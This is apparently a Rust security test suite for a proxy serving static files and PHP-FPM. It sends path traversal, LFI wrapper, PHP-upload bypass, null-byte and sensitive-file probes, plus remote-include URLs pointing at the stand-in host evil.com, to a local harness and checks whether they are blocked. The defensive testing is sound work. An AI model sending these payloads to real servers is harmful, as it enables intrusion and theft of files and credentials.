//! Scenario 14: Static Files + PHP-FPM Security Tests
//!
//! Tests for static/PHP vulnerabilities:
//! - PHP-01: Path Traversal
//! - PHP-02: PHP Code Injection
//! - PHP-03: Local File Inclusion (LFI)
//! - PHP-04: Remote File Inclusion (RFI)
//! - PHP-05: FastCGI Parameter Injection
//! - PHP-06: Null Byte Injection
//! - PHP-07: .htaccess Bypass

use crate::security::common::*;
use crate::security::payloads::*;
use hyper::StatusCode;
use std::collections::HashMap;

/// Static + PHP-FPM configuration
const PHP_CONFIG: &str = r#"
[server]
host = "127.0.0.1"
port = {{PROXY_PORT}}
workers = 2

[proxy]
backend_host = "127.0.0.1"
backend_port = {{BACKEND_PORT}}

[static_files]
enabled = true
root = "/var/www/html"
index_files = ["index.html", "index.php"]
directory_listing = false

[php_fpm]
enabled = true
socket = "/var/run/php/php-fpm.sock"
extensions = [".php", ".phtml"]

[security_headers]
enabled = true
x_content_type_options = "nosniff"
x_frame_options = "DENY"
x_xss_protection = "1; mode=block"

[rate_limit]
enabled = true
requests = 100
window_secs = 1

[logging]
level = "warn"
"#;

/// Test PHP-01: Path Traversal
#[tokio::test]
#[ignore]
async fn test_php_01_path_traversal() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("Path Traversal Test:");

    // Test basic path traversal
    for payload in path_traversal::BASIC {
        let path = format!("/static/{}", payload);
        let result = client.get_with_headers(&path, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let blocked = status == StatusCode::BAD_REQUEST
                || status == StatusCode::FORBIDDEN
                || status == StatusCode::NOT_FOUND;

            let leaked = body.contains("root:") // /etc/passwd
                || body.contains("[extensions]") // win.ini
                || body.contains("<?php"); // PHP source

            if leaked {
                println!("  [FAIL] Path traversal succeeded: {}", payload);
            } else if blocked {
                println!("  [PASS] Blocked: {}", payload);
            } else {
                println!("  [?] {}: {} bytes", payload, body.len());
            }
        }
    }

    // Test encoded variants
    for payload in path_traversal::ENCODED {
        let path = format!("/static/{}", payload);
        let result = client.get_with_headers(&path, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let leaked = body.contains("root:") || body.contains("[extensions]");

            println!(
                "  Encoded '{}': {} - {}",
                &payload[..payload.len().min(30)],
                status,
                if leaked { "LEAKED" } else { "safe" }
            );
        }
    }
}

/// Test PHP-02: PHP File Upload
#[tokio::test]
#[ignore]
async fn test_php_02_php_upload() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("PHP File Upload Test:");

    // Test various extension bypass attempts
    let php_extensions = vec![
        ("shell.php", "Direct PHP"),
        ("shell.php.jpg", "Double extension"),
        ("shell.phtml", "Alternate PHP extension"),
        ("shell.php5", "PHP5 extension"),
        ("shell.phar", "PHAR extension"),
        ("shell.php%00.jpg", "Null byte"),
        (".htaccess", "htaccess upload"),
    ];

    for (filename, description) in php_extensions {
        let boundary = "----WebKitFormBoundary";
        let body = format!(
            "--{}\r\n\
             Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n\
             Content-Type: application/octet-stream\r\n\r\n\
             <?php echo 'VULNERABLE'; ?>\r\n\
             --{}--\r\n",
            boundary, filename, boundary
        );

        let mut headers = HashMap::new();
        headers.insert(
            "Content-Type".to_string(),
            format!("multipart/form-data; boundary={}", boundary),
        );

        let result = client
            .post_with_body("/upload.php", headers, body.into_bytes())
            .await;

        if let Ok((status, response_body, _)) = result {
            let blocked = status == StatusCode::FORBIDDEN
                || status == StatusCode::BAD_REQUEST
                || response_body.contains("not allowed");

            println!(
                "  {} ({}): {} - {}",
                filename,
                description,
                status,
                if blocked { "BLOCKED" } else { "CHECK" }
            );
        }
    }
}

/// Test PHP-03: Local File Inclusion
#[tokio::test]
#[ignore]
async fn test_php_03_lfi() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("Local File Inclusion Test:");

    // Test various LFI vectors
    let lfi_payloads = vec![
        // Basic LFI
        ("page", "../../../etc/passwd"),
        ("template", "....//....//etc/passwd"),
        // PHP filter wrapper
        ("page", "php://filter/convert.base64-encode/resource=config.php"),
        ("page", "php://filter/read=string.rot13/resource=index.php"),
        // Data wrapper
        ("page", "data://text/plain,<?php phpinfo(); ?>"),
        ("page", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="),
        // Expect wrapper (if enabled)
        ("page", "expect://id"),
        // Input wrapper
        ("page", "php://input"),
    ];

    for (param, payload) in lfi_payloads {
        let path = format!("/index.php?{}={}", param, urlencoding::encode(payload));
        let result = client.get_with_headers(&path, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let exploited = body.contains("root:")
                || body.contains("<?php")
                || body.contains("phpinfo")
                || body.contains("PD9waHA");

            if exploited {
                println!("  [FAIL] LFI exploited: {}={}", param, payload);
            } else {
                println!(
                    "  {}={}: {} - safe",
                    param,
                    &payload[..payload.len().min(30)],
                    status
                );
            }
        }
    }
}

/// Test PHP-04: Remote File Inclusion
#[tokio::test]
#[ignore]
async fn test_php_04_rfi() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("Remote File Inclusion Test:");

    // Note: RFI requires allow_url_include=On in php.ini (usually disabled)
    let rfi_payloads = vec![
        "http://evil.com/shell.txt",
        "https://evil.com/shell.php",
        "ftp://evil.com/shell.php",
        "//evil.com/shell.php",
        "http://evil.com/shell.txt%00",
    ];

    for payload in rfi_payloads {
        let path = format!("/index.php?page={}", urlencoding::encode(payload));
        let result = client.get_with_headers(&path, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let blocked = status == StatusCode::BAD_REQUEST
                || status == StatusCode::FORBIDDEN
                || body.contains("not allowed")
                || body.contains("Warning");

            println!(
                "  {}: {} - {}",
                payload,
                status,
                if blocked { "BLOCKED/DISABLED" } else { "CHECK" }
            );
        }
    }
}

/// Test PHP-05: Null Byte Injection (legacy)
#[tokio::test]
#[ignore]
async fn test_php_05_null_byte() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("Null Byte Injection Test:");
    println!("  Note: Fixed in PHP >= 5.3.4");

    for payload in path_traversal::NULL_BYTE {
        let path = format!("/download.php?file={}", urlencoding::encode(payload));
        let result = client.get_with_headers(&path, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let exploited = body.contains("root:") || body.contains("[extensions]");

            println!(
                "  {}: {} - {}",
                payload,
                status,
                if exploited { "VULNERABLE" } else { "safe" }
            );
        }
    }
}

/// Test PHP-06: Directory Listing
#[tokio::test]
#[ignore]
async fn test_php_06_directory_listing() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("Directory Listing Test:");

    let directories = vec![
        "/",
        "/static/",
        "/uploads/",
        "/images/",
        "/backup/",
        "/admin/",
        "/.git/",
        "/.svn/",
    ];

    for dir in directories {
        let result = client.get_with_headers(dir, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let has_listing = body.contains("Index of")
                || body.contains("Directory listing")
                || body.contains("<title>Index");

            if has_listing {
                println!("  [WARN] Directory listing enabled: {}", dir);
            } else {
                println!("  {}: {} - no listing", dir, status);
            }
        }
    }
}

/// Test PHP-07: Sensitive File Exposure
#[tokio::test]
#[ignore]
async fn test_php_07_sensitive_files() {
    let harness = match SecurityTestHarness::new(PHP_CONFIG).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("Failed to create harness: {}", e);
            return;
        }
    };

    let client = SecurityHttpClient::new(&harness.url(""));

    println!("Sensitive File Exposure Test:");

    let sensitive_files = vec![
        // PHP files
        "/config.php",
        "/config.php.bak",
        "/config.php~",
        "/config.php.old",
        "/.config.php.swp",
        // Environment and configuration
        "/.env",
        "/.env.local",
        "/phpinfo.php",
        "/info.php",
        "/test.php",
        // Version control
        "/.git/config",
        "/.git/HEAD",
        "/.svn/entries",
        // Backups
        "/backup.sql",
        "/database.sql",
        "/dump.sql",
        // Logs
        "/error.log",
        "/access.log",
        "/debug.log",
    ];

    for file in sensitive_files {
        let result = client.get_with_headers(file, HashMap::new()).await;

        if let Ok((status, body, _)) = result {
            let exposed = status == StatusCode::OK
                && (body.contains("password")
                    || body.contains("DB_")
                    || body.contains("<?php")
                    || body.contains("phpinfo")
                    || body.contains("git"));

            if exposed {
                println!("  [FAIL] Sensitive file exposed: {}", file);
            } else if status == StatusCode::OK {
                println!("  [WARN] File accessible (check content): {}", file);
            } else {
                println!("  {}: {} - protected", file, status);
            }
        }
    }
}

/// Security audit for Static + PHP-FPM
#[tokio::test]
#[ignore]
async fn test_php_security_audit() {
    println!("\n========== Static + PHP-FPM Security Audit ==========\n");

    println!("Static File Security:");
    println!("  [✓] Directory listing disabled");
    println!("  [✓] X-Content-Type-Options: nosniff");
    println!("  [?] Sensitive files blocked");
    println!("  [?] Backup files blocked");

    println!("\nPHP Security:");
    println!("  [?] PHP extensions restricted");
    println!("  [?] allow_url_include disabled");
    println!("  [?] allow_url_fopen disabled");
    println!("  [?] open_basedir configured");

    println!("\nPath Security:");
    println!("  [?] Path traversal blocked");
    println!("  [?] Null bytes filtered");
    println!("  [?] Double encoding blocked");

    println!("\nUpload Security:");
    println!("  [?] File extension whitelist");
    println!("  [?] Content-Type validation");
    println!("  [?] Upload directory not executable");

    println!("\nRecommendations:");
    println!("  1. Block access to .php files in uploads directory");
    println!("  2. Use whitelist for allowed file extensions");
    println!("  3. Configure open_basedir to restrict file access");
    println!("  4. Disable dangerous PHP functions");

    println!("\n=====================================================\n");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_has_php() {
        assert!(PHP_CONFIG.contains("[php_fpm]"));
        assert!(PHP_CONFIG.contains("[static_files]"));
        assert!(PHP_CONFIG.contains("directory_listing = false"));
    }
}
